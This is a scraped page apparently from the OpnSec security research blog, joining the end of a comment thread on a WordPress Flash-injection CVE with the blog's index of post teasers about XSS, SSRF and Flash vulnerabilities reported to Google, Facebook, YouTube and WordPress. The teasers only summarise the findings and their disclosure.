* ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
  [October 13, 2017 at 10:39 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-121)

  Sorry the link I gave wasn‚Äôt technically correct, it‚Äôs this commit in WordPress/WordPress master branch <https://github.com/WordPress/WordPress/commit/7af3b927362c619752eedd3f9cf209cdaefa0eca>

  + ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
    [October 13, 2017 at 10:40 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-122)

    committed to master branch August 1st

Comments are closed.

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from opnsec.com_6f88ac3f_20250126_034119.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)

May 3, 2020

¬†|

[8 Comments](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comments)

How to use browser features to help find DOM XSS. The invisible Messages of Gmail Last year, I looked for DOM XSS in Gmail website. Instead of using url params or the emails themselves as the source of the attack, I decided to use the much more discreet yet ubiquitous postMessage api.¬† At first glance,‚Ä¶ [Read More](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)

---

# [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)

July 20, 2018

¬†|

[7 Comments](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/#comments)

Intro ‚Äì Testing Google Sites and Google Caja In March 2018, I reported an XSS in Google Caja, a tool to securely embed arbitrary html/javascript in a webpage. In May 2018, after the XSS was fixed, I realised that Google Sites was using an unpatched version of Google Caja, so I looked if it was‚Ä¶ [Read More](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)

---

# [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)

March 18, 2018

¬†|

[2 Comments](https://opnsec.com/2018/03/stored-xss-on-facebook/#comments)

tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS on Facebook wall in April 2017.¬†These stored XSS vulnerabilities were also present in WordPress so¬†I waited for WordPress to patch it before‚Ä¶ [Read More](https://opnsec.com/2018/03/stored-xss-on-facebook/)

---

# [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

October 19, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comments)

Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won‚Äôt provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I‚Äôm trying‚Ä¶ [Read More](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

---

# [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)

October 12, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comments)

Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017 What is the vulnerability ? There is an unpatched vulnerability in latest and older WordPress releases. The vulnerability is a cross-domain Flash injection (XSF), which impact‚Ä¶ [Read More](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)

---

# [Advanced Flash vulnerabilities in Youtube ‚Äì Part 4](https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/)

September 13, 2017

¬†|

[4 Comments](https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/#comments)

IV. Flash based XSSes on Youtube iframe api I‚Äôm happy that people found my previous posts on Youtube Flash vulnerabilities interesting, and I will keep posting new write-ups. This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback). Youtube html5 api is called Youtube iframe api, because‚Ä¶ [Read More](https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/)

---

# [Advanced Flash Vulnerabilities in Youtube ‚Äì Part 3](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/)

August 30, 2017

III. XSF via loaderinfo.url redefinition Let‚Äôs have a look at how the Main App loads the Modules : The url of the module is dynamically generated by the main app by using it‚Äôs own url (2) and replacing the filename (watch\_as3.swf) by the module filename (subtitles.swf) (3). This allows to handle multiple versions on the‚Ä¶ [Read More](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/)

---

# [Advanced Flash Vulnerabilities in Youtube ‚Äì Part 2](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/)

August 30, 2017

II. XSF via appLoader In Part 1, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com. This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing‚Ä¶ [Read More](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/)

---

# [Advanced Flash Vulnerabilities in Youtube ‚Äì Part 1](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/)

August 25, 2017

¬†|

[7 Comments](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/#comments)

Why Flash Security still matters? Flash is still an active threat. In 2017, I reported Flash vulnerabilities to Facebook, Youtube, WordPress, Yahoo, Paypal and Stripe. Over the last 3 years, I reported more than 50 Flash vulnerabilities to Bug Bounty programs. And there are many more I didn‚Äôt have the time to report or that‚Ä¶ [Read More](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/)

---

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).


